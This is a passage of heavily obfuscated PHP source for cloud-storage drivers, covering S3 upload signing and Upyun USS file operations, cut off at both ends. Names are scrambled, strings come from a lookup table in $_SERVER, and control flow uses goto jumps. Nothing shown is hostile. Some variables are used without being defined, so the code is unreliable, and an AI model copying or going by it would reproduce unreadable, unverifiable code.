$EÚ†óğëÏÆ < count($a±Ç´áØ“); $EÚ†óğëÏÆ++) { $e°öà³µõ = $Cñ‡³Ó¨ÒÛ . "\x28{$EÚ†óğëÏÆ}\x29"; if (!isset($a±Ç´áØ“[$e°öà³µõ])) { return $e°öà³µõ; } } return $e°öà³µõ; } } goto fó³¡……§¸; AçÏ‡Ü¥õÉ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($bó¦ÍÁ³¯‘) { parent::__construct($bó¦ÍÁ³¯‘); } public function uploadFormData($BäÓ„÷Î, $D’³Å÷¨¼á = 3600) { goto aäÃ‡‘Ëò; a‰Æ­ùØ»: $c°Éù½–À = array($this->accessKey, $BèÂ´ò÷Ëî, $this->region, $AÑ£¹¿²…£, $C©³èÂ ÓÑ); $BíİçŞ©Š¡ = implode($aÇæÑôŞ‹[18], $c°Éù½–À); $C†ˆ¬à‡ôÑ = array($aÇæÑôŞ‹[1109] => gmdate($aÇæÑôŞ‹[1108], strtotime($aÇæÑôŞ‹[1144])), $aÇæÑôŞ‹[1110] => array(array($aÇæÑôŞ‹[1112] => $this->bucket), array($aÇæÑôŞ‹[1111] => $BÄÍ¶ª…£), array($aÇæÑôŞ‹[1113], $aÇæÑôŞ‹[1114], $aÇæÑôŞ‹[43]), array($aÇæÑôŞ‹[1113], $aÇæÑôŞ‹[1145], $aÇæÑôŞ‹[43]), array($aÇæÑôŞ‹[1113], $aÇæÑôŞ‹[1146], $aÇæÑôŞ‹[43]), array($aÇæÑôŞ‹[1115] => $aƒ–’öİê), array($aÇæÑôŞ‹[1147] => $BíİçŞ©Š¡), array($aÇæÑôŞ‹[1148] => $c’©„ëÅ¯¼), array($aÇæÑôŞ‹[1149] => $B±ÚŸòË‚), array($aÇæÑôŞ‹[1150] => $e…« ½Î½))); goto dğßŠ†Àã£; dğßŠ†Àã£: $aÓ†×½ë¹Å = base64_encode(json_encode($C†ˆ¬à‡ôÑ)); $BÒí´¬ÚéÚ = hash_hmac($aÇæÑôŞ‹[1151], $BèÂ´ò÷Ëî, $aÇæÑôŞ‹[1152] . $this->secret, !0); $f‰ç£‚ˆ×Ì = hash_hmac($aÇæÑôŞ‹[1151], $this->region, $BÒí´¬ÚéÚ, !0); goto E•©Û ¹›; f…à¯ß‡å: $Eù‰÷õ¾ = array($aÇæÑôŞ‹[209] => $aÇæÑôŞ‹[43], $aÇæÑôŞ‹[1153] => $aÇæÑôŞ‹[43], $aÇæÑôŞ‹[1111] => $BÄÍ¶ª…£, $aÇæÑôŞ‹[1115] => $aƒ–’öİê, $aÇæÑôŞ‹[1119] => $aÓ†×½ë¹Å, $aÇæÑôŞ‹[1154] => $BíİçŞ©Š¡, $aÇæÑôŞ‹[1155] => $c’©„ëÅ¯¼, $aÇæÑôŞ‹[1156] => $B±ÚŸòË‚, $aÇæÑôŞ‹[1157] => $e…« ½Î½, $aÇæÑôŞ‹[1158] => $f¬Î‹–ùùÈ, $aÇæÑôŞ‹[179] => $this->getHost()); return $Eù‰÷õ¾; goto có»£†¬ñç; E•©Û ¹›: $DÃæ§ßğ® = hash_hmac($aÇæÑôŞ‹[1151], $AÑ£¹¿²…£, $f‰ç£‚ˆ×Ì, !0); $Fïç‰í«´ç = hash_hmac($aÇæÑôŞ‹[1151], $C©³èÂ ÓÑ, $DÃæ§ßğ®, !0); $f¬Î‹–ùùÈ = hash_hmac($aÇæÑôŞ‹[1151], $aÓ†×½ë¹Å, $Fïç‰í«´ç); goto f…à¯ß‡å; aäÃ‡‘Ëò: $aÇæÑôŞ‹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÄÍ¶ª…£ = $aÇæÑôŞ‹[195]; $c’©„ëÅ¯¼ = $aÇæÑôŞ‹[1141]; goto EÃŒß¥í¬²; D·ˆö”õ”‚: $C©³èÂ ÓÑ = $aÇæÑôŞ‹[1143]; $e…« ½Î½ = $D’³Å÷¨¼á . $aÇæÑôŞ‹[43]; $aƒ–’öİê = $aÇæÑôŞ‹[1107]; goto a‰Æ­ùØ»; EÃŒß¥í¬²: $AÑ£¹¿²…£ = $aÇæÑôŞ‹[69]; $B±ÚŸòË‚ = gmdate($aÇæÑôŞ‹[1142]); $BèÂ´ò÷Ëî = gmdate($aÇæÑôŞ‹[699]); goto D·ˆö”õ”‚; có»£†¬ñç: } public function multiUploadFormData($FÌÂ¶ ÍêÑ, $FÁ—ì×µ÷Ó = 3600) { $CÚºÌØé¦ì =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b£Ÿ±¼¡ = gmdate($CÚºÌØé¦ì[1237]); $aØãò•ªŸ¦ = array(); $CÂ±¹Ü÷¿ö = $this->client->getUploadId($this->bucket, $FÌÂ¶ ÍêÑ, $aØãò•ªŸ¦); if (!$CÂ±¹Ü÷¿ö) { return !1; } return array($CÚºÌØé¦ì[219] => $CÂ±¹Ü÷¿ö, $CÚºÌØé¦ì[179] => $this->getHost() . $CÚºÌØé¦ì[18] . $this->pathEncode($FÌÂ¶ ÍêÑ), $CÚºÌØé¦ì[220] => $b£Ÿ±¼¡, $CÚºÌØé¦ì[99] => $FÌÂ¶ ÍêÑ); } public function multiUploadAuthData($B“®Üá»Ü, $FÈ•·ºÑœº = array()) { goto C•ó×‰†óù; C•ó×‰†óù: $AŠ„·Úæ¸ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a•›Š¢êÙ„ = isset($FÈ•·ºÑœº[$AŠ„·Úæ¸[170]]) ? $FÈ•·ºÑœº[$AŠ„·Úæ¸[170]] : $AŠ„·Úæ¸[43]; $bÌµ¸í‹ = $FÈ•·ºÑœº[$AŠ„·Úæ¸[99]]; goto CÆ»»´¯¸õ; AÍÑôˆ®æˆ: $A™ğŒµ• = $AŠ„·Úæ¸[224]; $a®ÊĞŞÃßŒ = $AŠ„·Úæ¸[18] . $this->pathEncode($bÌµ¸í‹) . $a•›Š¢êÙ„; $AÈ’äâµÕ… = $this->client->__getSignatureV4($c„¡®¬½‹ñ, $AìçÎ»éêë, $A™ğŒµ•, $a®ÊĞŞÃßŒ); goto cêáæ’ãŠ«; CÆ»»´¯¸õ: unset($FÈ•·ºÑœº[$AŠ„·Úæ¸[99]]); if (isset($FÈ•·ºÑœº[$AŠ„·Úæ¸[221]])) { return $this->listUploadParts($bÌµ¸í‹, $FÈ•·ºÑœº); } $c„¡®¬½‹ñ = array(); goto cáÉ¸î·‰; cáÉ¸î·‰: if (isset($FÈ•·ºÑœº[$AŠ„·Úæ¸[1238]])) { $c„¡®¬½‹ñ[$AŠ„·Úæ¸[1239]] = $FÈ•·ºÑœº[$AŠ„·Úæ¸[1238]]; } $e¼Û‰è÷ÆÆ = explode($AŠ„·Úæ¸[181], $this->getHost()); $AìçÎ»éêë = array($AŠ„·Úæ¸[1240] => $e¼Û‰è÷ÆÆ[1], $AŠ„·Úæ¸[1241] => $AŠ„·Úæ¸[43], $AŠ„·Úæ¸[209] => $AŠ„·Úæ¸[126], $AŠ„·Úæ¸[1153] => $FÈ•·ºÑœº[$AŠ„·Úæ¸[87]]); goto AÍÑôˆ®æˆ; cêáæ’ãŠ«: if (strpos($a•›Š¢êÙ„, $AŠ„·Úæ¸[223]) === 0) { if (isset($c„¡®¬½‹ñ[$AŠ„·Úæ¸[1239]])) { $b‡ó…º‚ö = $c„¡®¬½‹ñ[$AŠ„·Úæ¸[1239]]; } else { if (isset($AÈ’äâµÕ…[$AŠ„·Úæ¸[1239]])) { $b‡ó…º‚ö = $AÈ’äâµÕ…[$AŠ„·Úæ¸[1239]]; } else { $b‡ó…º‚ö = hash($AŠ„·Úæ¸[1151], $AŠ„·Úæ¸[43]); } } return array($AŠ„·Úæ¸[229] => $AÈ’äâµÕ…[$AŠ„·Úæ¸[229]], $AŠ„·Úæ¸[1239] => $b‡ó…º‚ö, $AŠ„·Úæ¸[220] => $AÈ’äâµÕ…[$AŠ„·Úæ¸[1242]]); } return $AÈ’äâµÕ…[$AŠ„·Úæ¸[229]]; goto E”Ñ¢êõ‚Î; E”Ñ¢êõ‚Î: } public function listUploadParts($DÄ°ƒÜ¹™, $d×˜ŞŠŞˆŠ = array()) { goto bŸ‚ÑÂ„èŒ; EâĞ•¥¡—: $dºÒáñğª… .= $bå­º©‡¤Î[1246]; $dß®×‘Ÿ•ê = array(); $c¦‚ÓÏŠ÷ˆ = explode($bå­º©‡¤Î[181], $this->getHost()); goto DÄ¿ê¤…êâ; cêÁ†ˆ¤İÃ: $bÏ…Æí°† = $this->client->__getSignatureV4($dß®×‘Ÿ•ê, $EÅ¯‹âÖÍ›, $EÁ®¢Íá, $eëƒ¥‰àŞï, $dºÒáñğª…); return array($bå­º©‡¤Î[229] => $bÏ…Æí°†[$bå­º©‡¤Î[229]], $bå­º©‡¤Î[220] => $bÏ…Æí°†[$bå­º©‡¤Î[1242]], $bå­º©‡¤Î[231] => $bªÏ„¨ºà, $bå­º©‡¤Î[1239] => $bÏ…Æí°†[$bå­º©‡¤Î[1239]]); goto E¨’áˆ‚İ¬; B­á¢Œ„ˆé: if (!$bªÏ„¨ºà) { return !1; } $dºÒáñğª… = $bå­º©‡¤Î[1243]; foreach ($bªÏ„¨ºà as $a‚å†Ñ¢¯í) { $dºÒáñğª… .= $bå­º©‡¤Î[1244] . "\74\120\141\162\164\x4e\x75\155\142\145\162\x3e{$a‚å†Ñ¢¯í[$bå­º©‡¤Î[1195]]}\x3c\57\x50\x61\162\x74\x4e\165\155\x62\145\162\76\12" . "\74\x45\x54\x61\147\x3e{$a‚å†Ñ¢¯í[$bå­º©‡¤Î[1196]]}\x3c\57\x45\x54\141\147\x3e\12" . $bå­º©‡¤Î[1245]; } goto EâĞ•¥¡—; bŸ‚ÑÂ„èŒ: $bå­º©‡¤Î =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f¶¡ÄÃÎª‰ = str_replace($bå­º©‡¤Î[230], $bå­º©‡¤Î[43], $d×˜ŞŠŞˆŠ[$bå­º©‡¤Î[170]]); $bªÏ„¨ºà = $this->client->listParts($this->bucket, $DÄ°ƒÜ¹™, $f¶¡ÄÃÎª‰); goto B­á¢Œ„ˆé; DÄ¿ê¤…êâ: $EÅ¯‹âÖÍ› = array($bå­º©‡¤Î[1240] => $c¦‚ÓÏŠ÷ˆ[1], $bå­º©‡¤Î[209] => $bå­º©‡¤Î[126], $bå­º©‡¤Î[1153] => strlen($dºÒáñğª…)); $EÁ®¢Íá = $bå­º©‡¤Î[222]; $eëƒ¥‰àŞï = $bå­º©‡¤Î[18] . $this->pathEncode($DÄ°ƒÜ¹™) . $d×˜ŞŠŞˆŠ[$bå­º©‡¤Î[170]]; goto cêÁ†ˆ¤İÃ; E¨’áˆ‚İ¬: } public function link($dó¢ÛÛ±Ù‚, $Ağ¬Î˜á³ = array()) { return parent::link($dó¢ÛÛ±Ù‚, $Ağ¬Î˜á³); } public function fileOut($e‚Œô‰Ú¼ª, $EöñºËºêõ = false, $E÷Ñ—Â½ÔŒ = false, $D˜à³á„å± = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[çŞáÓæÚô‚Ô‡][1247])) { return parent::fileOutServer($e‚Œô‰Ú¼ª, $EöñºËºêõ, $E÷Ñ—Â½ÔŒ, $D˜à³á„å±); } parent::fileOut($e‚Œô‰Ú¼ª, $EöñºËºêõ, $E÷Ñ—Â½ÔŒ, $D˜à³á„å±); } public function fileOutImage($EèÛáÀ è, $e×é¢Ãª¼á = 250) { if (strstr($this->endpoint, $_SERVER[çŞáÓæÚô‚Ô‡][1247])) { return parent::fileOutImageServer($EèÛáÀ è, $e×é¢Ãª¼á); } parent::fileOutImage($EèÛáÀ è, $e×é¢Ãª¼á); } public function fileOutLink($c©¬§™Ÿ‚Œ) { $fÜĞ‚İŞŠ£ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (substr($c©¬§™Ÿ‚Œ, 0, 7) == $fÜĞ‚İŞŠ£[1122]) { $c©¬§™Ÿ‚Œ = $fÜĞ‚İŞŠ£[1123] . substr($c©¬§™Ÿ‚Œ, 7); } header($fÜĞ‚İŞŠ£[166] . $c©¬§™Ÿ‚Œ); die; } public function getHost() { $A¼õ¸Ñåİ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fĞŠë­„ = str_rtrim(parent::getHost(), $A¼õ¸Ñåİ[18] . $this->bucket); $fĞŠë­„ = explode($A¼õ¸Ñåİ[181], $fĞŠë­„); return $fĞŠë­„[0] . $A¼õ¸Ñåİ[181] . $this->bucket . $A¼õ¸Ñåİ[101] . $fĞŠë­„[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($b°ßŠ¸è†¯, $céÉÃÆÓá = 0) { parent::__construct(); $this->source = $b°ßŠ¸è†¯; $this->sourceSize = $céÉÃÆÓá; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($b•ğà‚öÜ = false) { return $this->sourceSize; } public function getContent($FÊÍ¦øÀ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { if ($this->sourceSize <= 0) { return $_SERVER[çŞáÓæÚô‚Ô‡][43]; } $dÁ´µœâ± = ftell($this->source); $EŞ¥Ì‹­á¦ = @fread($this->source, $this->sourceSize); fseek($this->source, $dÁ´µœâ±); return $EŞ¥Ì‹­á¦; } } public function fileSubstr($bŸƒùİ³‘Ø = false, $Dãƒ£ßØºğ = 0, $C®ëÈñ… = 0) { if (!$C®ëÈñ…) { $C®ëÈñ… = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Dãƒ£ßØºğ, $C®ëÈñ…); } if ($this->sourceType == self::TYPE_FILE) { if ($C®ëÈñ… <= 0) { return $_SERVER[çŞáÓæÚô‚Ô‡][43]; } $e¶ß¨ÀˆÛœ = ftell($this->source); fseek($this->source, $e¶ß¨ÀˆÛœ + $Dãƒ£ßØºğ); $fÉ…Èå¦¯º = @fread($this->source, $C®ëÈñ…); fseek($this->source, $e¶ß¨ÀˆÛœ); return $fÉ…Èå¦¯º; } } public function hashMd5($e‹Å ¡˜âî = false) { return md5($this->getContent()); } public static function hash($a—·©á³, $A¿¯–„âŞˆ = 0) { $e¼óİ×”½¾ = new PathDriverStream($a—·©á³, $A¿¯–„âŞˆ); return $e¼óİ×”½¾->hashSimple($a—·©á³); } public static function md5($B¯Ï¡Ú…Ãà, $aÌ–øæ‘ø = 0) { $EŸ»Ò„÷š° = new PathDriverStream($B¯Ï¡Ú…Ãà, $aÌ–øæ‘ø); return $EŸ»Ò„÷š°->hashMd5($B¯Ï¡Ú…Ãà); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\72\x2f\57\166\x30\56\x61\x70\151\x2e\165\x70\x79\165\x6e\x2e\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($A¹Şó´Â­¤) { parent::__construct(); $this->_init($A¹Şó´Â­¤); } public function _init($CÅ•¶ÈÆ †) { foreach ($CÅ•¶ÈÆ † as $a”‘ôØÌÓ => $eØ¶ÀìØ©Ï) { if (isset($this->{$a”‘ôØÌÓ})) { $this->{$a”‘ôØÌÓ} = $eØ¶ÀìØ©Ï; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[çŞáÓæÚô‚Ô‡][1248], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($BÅïŒˆºõ, $e±Æù¿Æ„ = "\107\105\124") { $cÚò”ŠÓ¨» =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bÜ§Ï«í¶ = gmdate($cÚò”ŠÓ¨»[1212]); $D¤—¸İ‹Ü = base64_encode(hash_hmac($cÚò”ŠÓ¨»[1249], "{$e±Æù¿Æ„}\46{$BÅïŒˆºõ}\x26{$bÜ§Ï«í¶}", md5("{$this->userpass}"), !0)); $Bäµ¸¥‰‹é = array("\x41\165\x74\x68\x6f\x72\x69\172\x61\164\x69\x6f\x6e\72\125\120\131\x55\116\x20{$this->username}\72{$D¤—¸İ‹Ü}", "\104\141\x74\145\x3a{$bÜ§Ï«í¶}"); return $Bäµ¸¥‰‹é; } public function ussRequest($F”Û…Á´ãÂ, $bé ß±šÑ = "\107\x45\x54", $FÉöŸà‰á = false, $E¨”Š¾œ = false, $bÉ‹‡öâÁã = false) { goto C‰÷ Õ‰•; c÷ÃŠô‡: if (!$F’”´Ü‡®¨) { return array($b‹¶ã«ßçô[1039] => !1, $b‹¶ã«ßçô[1041] => $b‹¶ã«ßçô[1250]); } if (strtolower($bé ß±šÑ) == $b‹¶ã«ßçô[194] || in_array($F’”´Ü‡®¨[$b‹¶ã«ßçô[1039]], array($b‹¶ã«ßçô[1107], $b‹¶ã«ßçô[1251]))) { $FÉöŸà‰á = $F’”´Ü‡®¨[$b‹¶ã«ßçô[1252]]; } else { $FÉöŸà‰á = json_decode($F’”´Ü‡®¨[$b‹¶ã«ßçô[1041]], !0); if (!$FÉöŸà‰á) { $FÉöŸà‰á = $F’”´Ü‡®¨[$b‹¶ã«ßçô[1041]]; } else { if (!$F’”´Ü‡®¨[$b‹¶ã«ßçô[698]] && isset($FÉöŸà‰á[$b‹¶ã«ßçô[1253]])) { $FÉöŸà‰á = $FÉöŸà‰á[$b‹¶ã«ßçô[1253]]; } } } return array($b‹¶ã«ßçô[1039] => $F’”´Ü‡®¨[$b‹¶ã«ßçô[698]], $b‹¶ã«ßçô[1041] => $FÉöŸà‰á); goto f‡ˆ‘„Ÿ¢Ñ; d§Üì¬Œ‡²: $AÂÜËšÅù = $this->ussHeaders($cŒâ¢õª£, $bé ß±šÑ); if ($E¨”Š¾œ) { $AÂÜËšÅù = array_merge($AÂÜËšÅù, $E¨”Š¾œ); } $F’”´Ü‡®¨ = url_request($this->endpoint . $cŒâ¢õª£, $bé ß±šÑ, $FÉöŸà‰á, $AÂÜËšÅù, $bÉ‹‡öâÁã); goto c÷ÃŠô‡; C‰÷ Õ‰•: $b‹¶ã«ßçô =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F”Û…Á´ãÂ = trim($F”Û…Á´ãÂ, $b‹¶ã«ßçô[18]); $cŒâ¢õª£ = "\57{$this->bucket}\x2f{$F”Û…Á´ãÂ}"; goto d§Üì¬Œ‡²; f‡ˆ‘„Ÿ¢Ñ: } public function mkfile($eŞê¥È×, $A‹¡ŒÍÉÊ = '', $cç…È»‰Ì = REPEAT_RENAME) { if ($this->setContent($eŞê¥È×, $A‹¡ŒÍÉÊ)) { return $this->getPathOuter($eŞê¥È×); } return !1; } public function mkdir($Cáßò´”Ñí, $B„×£’å»‹ = REPEAT_SKIP) { $B¥Ì¹¾„Ï =& $_SERVER[çŞáÓæÚô‚Ô‡]; $d°‹îÌå†“ = trim($Cáßò´”Ñí, $B¥Ì¹¾„Ï[18]); if ($this->_isFolder($d°‹îÌå†“)) { return $this->getPathOuter($d°‹îÌå†“); } $cÏéìÊãä = array($B¥Ì¹¾„Ï[1254]); $B‡ìöÍ»Ó‚ = $this->ussRequest($d°‹îÌå†“, $B¥Ì¹¾„Ï[222], !1, $cÏéìÊãä); return $B‡ìöÍ»Ó‚[$B¥Ì¹¾„Ï[1039]] ? $this->getPathOuter($d°‹îÌå†“) : !1; } public function copyFile($b‰öŸÛÓñÑ, $E‰é•³ïõ) { $e‘ğ¾ĞÙêò =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EğÆâÑ¢Á = array($e‘ğ¾ĞÙêò[1255] . "\57{$this->bucket}\x2f{$b‰öŸÛÓñÑ}", $e‘ğ¾ĞÙêò[1256]); $d­ÃäÀÇ”Ò = $this->ussRequest($E‰é•³ïõ, $e‘ğ¾ĞÙêò[224], !1, $EğÆâÑ¢Á); return $d­ÃäÀÇ”Ò[$e‘ğ¾ĞÙêò[1039]] ? !0 : $this->getPathOuter($E‰é•³ïõ); } public function moveFile($FÀ×«»ÎÌì, $F†¬­Š„ö) { $C‹µŠºØ¹æ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aÆÅëÌˆËÈ = array($C‹µŠºØ¹æ[1257] . "\x2f{$this->bucket}\x2f{$FÀ×«»ÎÌì}", $C‹µŠºØ¹æ[1256]); $cÜë­÷‡Ç² = $this->ussRequest($F†¬­Š„ö, $C‹µŠºØ¹æ[224], !1, $aÆÅëÌˆËÈ); return $cÜë­÷‡Ç²[$C‹µŠºØ¹æ[1039]] ? !0 : $this->getPathOuter($F†¬­Š„ö); } public function delFile($aÖºŸÎå›è) { $c‘„åŒ…Œ¤ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $d…èÁôó§´ = $this->ussRequest($aÖºŸÎå›è, $c‘„åŒ…Œ¤[1258]); return $d…èÁôó§´[$c‘„åŒ…Œ¤[1039]] ? !0 : !1; } public function delFolder($d¤ßã˜ºƒÇ) { $AÓñíÜ×ò =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e‚ÍÀæóÌô = $this->listAll($d¤ßã˜ºƒÇ); krsort($e‚ÍÀæóÌô); foreach ($e‚ÍÀæóÌô as $a©Ö†¢†‹í) { $this->ussRequest($a©Ö†¢†‹í[$AÓñíÜ×ò[85]], $AÓñíÜ×ò[1258]); } return $this->ussRequest($d¤ßã˜ºƒÇ, $AÓñíÜ×ò[1258]); } public function rename($cí²Î–Ü¿Í, $F¸¯Á›·Ñ¹) { if ($this->isFile($cí²Î–Ü¿Í)) { $F¸¯Á›·Ñ¹ = get_path_father($cí²Î–Ü¿Í) . $F¸¯Á›·Ñ¹; return $this->moveFile($cí²Î–Ü¿Í, $F¸¯Á›·Ñ¹); } return $this->renameObject($cí²Î–Ü¿Í, $F¸¯Á›·Ñ¹); } public function fileInfo($BÛã”íÖ¶Ã, $Aí–Ò˜ÎÙñ = false, $Bâ…‡‡êñÆ = array()) { $Bâ³ÔˆµïŠ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($Aí–Ò˜ÎÙñ) { return array($Bâ³ÔˆµïŠ[38] => $this->pathThis($BÛã”íÖ¶Ã), $Bâ³ÔˆµïŠ[85] => $this->getPathOuter($Bâ³ÔˆµïŠ[18] . $BÛã”íÖ¶Ã), $Bâ³ÔˆµïŠ[39] => $Bâ³ÔˆµïŠ[177], $Bâ³ÔˆµïŠ[87] => isset($Bâ…‡‡êñÆ[$Bâ³ÔˆµïŠ[334]]) ? $Bâ…‡‡êñÆ[$Bâ³ÔˆµïŠ[334]] : 0, $Bâ³ÔˆµïŠ[170] => $this->ext($BÛã”íÖ¶Ã)); } $A³æŞÃˆô£ = array($Bâ³ÔˆµïŠ[38] => $this->pathThis($BÛã”íÖ¶Ã), $Bâ³ÔˆµïŠ[85] => $this->getPathOuter($Bâ³ÔˆµïŠ[18] . $BÛã”íÖ¶Ã), $Bâ³ÔˆµïŠ[39] => $Bâ³ÔˆµïŠ[177], $Bâ³ÔˆµïŠ[197] => 0, $Bâ³ÔˆµïŠ[117] => isset($Eİ¦¦™„Ó[$Bâ³ÔˆµïŠ[1259]]) ? $Eİ¦¦™„Ó[$Bâ³ÔˆµïŠ[1259]] : 0, $Bâ³ÔˆµïŠ[87] => isset($Bâ…‡‡êñÆ[$Bâ³ÔˆµïŠ[334]]) ? $Bâ…‡‡êñÆ[$Bâ³ÔˆµïŠ[334]] : 0, $Bâ³ÔˆµïŠ[170] => $this->ext($BÛã”íÖ¶Ã), $Bâ³ÔˆµïŠ[198] => !0, $Bâ³ÔˆµïŠ[199] => !0); if (empty($Bâ…‡‡êñÆ)) { $Bâ…‡‡êñÆ = $this->objectMeta($BÛã”íÖ¶Ã); if (!$Bâ…‡‡êñÆ) { return $A³æŞÃˆô£; } $A³æŞÃˆô£[$Bâ³ÔˆµïŠ[197]] = $Bâ…‡‡êñÆ[$Bâ³ÔˆµïŠ[1260]]; $A³æŞÃˆô£[$Bâ³ÔˆµïŠ[117]] = $Bâ…‡‡êñÆ[$Bâ³ÔˆµïŠ[1261]]; $A³æŞÃˆô£[$Bâ³ÔˆµïŠ[87]] = $Bâ…‡‡êñÆ[$Bâ³ÔˆµïŠ[87]]; } return $A³æŞÃˆô£; } public function folderInfo($F‰§•‰¤š¥, $Fİ‹‚©¶ç = false) { $b°†“À…Ä‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($Fİ‹‚©¶ç) { return array($b°†“À…Ä‰[38] => $this->pathThis($F‰§•‰¤š¥), $b°†“À…Ä‰[85] => $this->getPathOuter($b°†“À…Ä‰[18] . $F‰§•‰¤š¥), $b°†“À…Ä‰[39] => $b°†“À…Ä‰[86]); } $B›³‚·¤Œ… = array($b°†“À…Ä‰[38] => $this->pathThis($F‰§•‰¤š¥), $b°†“À…Ä‰[85] => $this->getPathOuter($b°†“À…Ä‰[18] . $F‰§•‰¤š¥), $b°†“À…Ä‰[39] => $b°†“À…Ä‰[86], $b°†“À…Ä‰[197] => 0, $b°†“À…Ä‰[117] => isset($Aæè¼ÚÍ¶[$b°†“À…Ä‰[1259]]) ? $Aæè¼ÚÍ¶[$b°†“À…Ä‰[1259]] : 0, $b°†“À…Ä‰[1169] => !0, $b°†“À…Ä‰[1170] => !0); if (empty($e±œÃäôÊÕ)) { $e±œÃäôÊÕ = $this->objectMeta($F‰§•‰¤š¥); if (!$e±œÃäôÊÕ) { return $B›³‚·¤Œ…; } $B›³‚·¤Œ…[$b°†“À…Ä‰[197]] = $e±œÃäôÊÕ[$b°†“À…Ä‰[1260]]; $B›³‚·¤Œ…[$b°†“À…Ä‰[117]] = $e±œÃäôÊÕ[$b°†“À…Ä‰[1261]]; } return $B›³‚·¤Œ…; } private function fileList($DÄ¹†¾–·Œ, $f¸ÓÏ÷çäÒ = 0, $C²«ç¸Ü–Ã = 1000) { $aÑ¼±áÒ±¾ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f§¼±ÓÑ£ = array($aÑ¼±áÒ±¾[1262], $aÑ¼±áÒ±¾[1263] . $C²«ç¸Ü–Ã); if ($f¸ÓÏ÷çäÒ) { $f§¼±ÓÑ£[] = $aÑ¼±áÒ±¾[1264] . $f¸ÓÏ÷çäÒ; } $DŞØÜÎŒ£Ç = $this->ussRequest($DÄ¹†¾–·Œ, $aÑ¼±áÒ±¾[226], !1, $f§¼±ÓÑ£); return !$DŞØÜÎŒ£Ç[$aÑ¼±áÒ±¾[1039]] ? !1 : $DŞØÜÎŒ£Ç[$aÑ¼±áÒ±¾[1041]]; } public function listPath($E±Áª‚‚ùå, $b¸–„Ÿ’å¡ = false) { goto A¨ßÚóºÜ¤; dø¬Éö—Çˆ: return array($BÖÆÚµßÛ‰[84] => $fßìÇ–îÁ, $BÖÆÚµßÛ‰[83] => $aï³ÏŸŞ‹Æ); goto côà½ğ½‘Ô; A¨ßÚóºÜ¤: $BÖÆÚµßÛ‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cã›·ØØÛœ = $BÖÆÚµßÛ‰[43]; $FÇ‘—Ûæ›¿ = 1000; goto bó•‘ÒÅàÎ; bó•‘ÒÅàÎ: $fßìÇ–îÁ = $aï³ÏŸŞ‹Æ = array(); $aÛêŞñõ = rtrim($E±Áª‚‚ùå, $BÖÆÚµßÛ‰[18]) . $BÖÆÚµßÛ‰[18]; while (!0) { $EÕ‚â¬°¯â = $this->fileList($E±Áª‚‚ùå, $cã›·ØØÛœ, $FÇ‘—Ûæ›¿); if (!$EÕ‚â¬°¯â) { return !1; } $cã›·ØØÛœ = isset($EÕ‚â¬°¯â[$BÖÆÚµßÛ‰[1265]]) ? $EÕ‚â¬°¯â[$BÖÆÚµßÛ‰[1265]] : $BÖÆÚµßÛ‰[43]; $A‚å‰‘ãŒ = isset($EÕ‚â¬°¯â[$BÖÆÚµßÛ‰[1266]]) ? $EÕ‚â¬°¯â[$BÖÆÚµßÛ‰[1266]] : array(); foreach ($A‚å‰‘ãŒ as $E™õ«‡ùº) { if ($E™õ«‡ùº[$BÖÆÚµßÛ‰[39]] == $BÖÆÚµßÛ‰[86]) { $fßìÇ–îÁ[] = $this->folderInfo($aÛêŞñõ . $E™õ«‡ùº[$BÖÆÚµßÛ‰[38]], $b¸–„Ÿ’å¡, $E™õ«‡ùº); } else { $aï³ÏŸŞ‹Æ[] = $this->fileInfo($aÛêŞñõ . $E™õ«‡ùº[$BÖÆÚµßÛ‰[38]], $b¸–„Ÿ’å¡, $E™õ«‡ùº); } } if (count($A‚å‰‘ãŒ) < $FÇ‘—Ûæ›¿) { break; } } goto dø¬Éö—Çˆ; côà½ğ½‘Ô: } private function recursionAllFiles($AØ«˜ø»ƒ¨, &$F „„Ù²½ƒ) { $aÎ‰ñ’ó¬¦ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B‡ÇÀ•ÏÈ = $aÎ‰ñ’ó¬¦[43]; $B”ì¬Š¦Ë = 1000; $eÈÏ‹ñ‘’ = $c¾ŠÇØ×ÌŸ = array(); $a¾ˆ³ Œ‡ = rtrim($AØ«˜ø»ƒ¨, $aÎ‰ñ’ó¬¦[18]) . $aÎ‰ñ’ó¬¦[18]; while (!0) { $Cğªì°ø†ù = $this->fileList($AØ«˜ø»ƒ¨, $B‡ÇÀ•ÏÈ, $B”ì¬Š¦Ë); if (!$Cğªì°ø†ù) { return !1; } $B‡ÇÀ•ÏÈ = isset($Cğªì°ø†ù[$aÎ‰ñ’ó¬¦[1265]]) ? $Cğªì°ø†ù[$aÎ‰ñ’ó¬¦[1265]] : $aÎ‰ñ’ó¬¦[43]; $DÎÙ»áå¤ø = isset($Cğªì°ø†ù[$aÎ‰ñ’ó¬¦[1266]]) ? 